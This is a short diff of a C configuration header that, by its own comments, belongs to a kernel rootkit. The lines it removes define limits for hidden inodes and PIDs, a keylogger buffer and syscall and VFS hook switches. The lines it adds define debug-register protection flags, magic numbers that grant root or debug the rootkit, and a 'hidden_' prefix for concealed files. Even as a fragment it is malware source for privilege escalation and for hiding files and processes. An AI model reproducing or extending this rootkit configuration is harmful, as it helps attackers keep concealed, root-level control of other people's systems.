@@ -1,27 +1,14 @@
 #ifndef __CONFIG_H
 #define __CONFIG_H
 
-#define MAX_HIDDEN_INODES 1024
-#define MAX_HIDDEN_PIDS   1024
-#define MAX_PATH_LEN	  512
-#define MAX_PATH_REDIRECT 32
-#define KEYLOGGER_BUFLEN  2048
+#define CONFIG_DR_PROTECT  1 /* debug register access protection */
+#define CONFIG_PATCH_DEBUG 0 /* 0 => use die_notifier, 1 => patch_debug */
 
-struct subversive_config {
-	int state;
-#define RK_BOOT		0
-#define RK_ACTIVE	1
-#define RK_SHUTDOWN	2
+/* rootkit interface */
+#define MAGIC_NUMBER_GET_ROOT 0x42424242 /* TODO: should be randomized */
+#define MAGIC_NUMBER_DEBUG_RK 0x43434343
 
-#ifdef ARCH_X86
-	int dr_protect;		/* DR access protection */
-	int patch_debug;	/* 1 => patch_debug, 0 => die_notifier */
-#endif
-
-	int hook_syscall;
-	int hook_vfs;
-	int keylogger;
-};
-extern struct subversive_config rk_cfg;
+/* VFS */
+#define FILE_HIDDEN_PREFIX "hidden_"
 
 #endif
